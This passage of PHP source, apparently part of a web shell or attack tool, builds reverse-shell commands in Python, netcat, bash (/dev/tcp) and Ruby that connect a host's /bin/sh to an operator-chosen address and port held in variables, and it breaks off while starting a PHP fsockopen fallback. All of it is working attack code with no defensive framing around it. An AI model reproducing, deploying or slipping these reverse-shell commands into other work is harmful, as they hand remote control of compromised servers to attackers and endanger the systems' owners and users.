           case 'python':
                $cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$bh.'",'.$bp.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &';
                break;
            case 'nc':
                $nb = trim(@shell_exec('which nc 2>/dev/null') ?: @shell_exec('which ncat 2>/dev/null') ?: 'nc');
                $cmd = "$nb -e /bin/sh $bh $bp &";
                break;
            case 'bash':
                $cmd = "bash -c 'bash -i >& /dev/tcp/$bh/$bp 0>&1' &";
                break;
            case 'ruby':
                $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
                break;
            default: // PHP
                if (!in_array('proc_open', $availExec)) {
                    // Try fsockopen method
                    $sock = @fsockopen($bh, $bp, $e